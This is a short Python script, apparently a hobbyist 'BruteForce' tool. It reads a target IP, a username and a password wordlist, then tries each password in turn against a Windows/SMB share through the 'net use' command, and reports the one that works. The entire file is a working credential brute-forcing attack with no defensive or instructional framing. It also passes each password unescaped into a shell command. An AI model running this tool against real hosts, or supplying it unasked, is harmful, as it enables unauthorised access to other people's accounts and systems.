import os



class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'





banner = """
________              _____     ________                        
___  __ )__________  ___  /________  __/_______________________ 
__  __  |_  ___/  / / /  __/  _ \_  /_ _  __ \_  ___/  ___/  _ /
_  /_/ /_  /   / /_/ // /_ /  __/  __/ / /_/ /  /   / /__ /  __/
/_____/ /_/    \__,_/ \__/ \___//_/    \____//_/    \___/ \___/ """

print(bcolors.RED + banner)




def attempt(ip, user, password):
    response = os.system(f'net use \\\\{ip} /user:{user} {password} >nul 2>&1')
    return response == 0

def main():
    ip = input(bcolors.GREEN + "Enter IP Address: ")
    user = input(bcolors.GREEN + "Enter Username: ")
    wordlist = input(bcolors.GREEN + "Enter Password List: ")

    try:
        with open(wordlist, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(bcolors.RED + "Wordlist file not found.")
        return

    for password in passwords:
        password = password.strip()
        print(bcolors.GREEN + f'Attempt: {password}')
        if attempt(ip, user, password):
            print(bcolors.GREEN + f"Password Found: {password}")
            os.system(f'net use \\\\{ip} /d /y >nul 2>&1')
            break
    else:
        print(bcolors.RED + "Password not found :(")

if __name__ == "__main__":
    main()

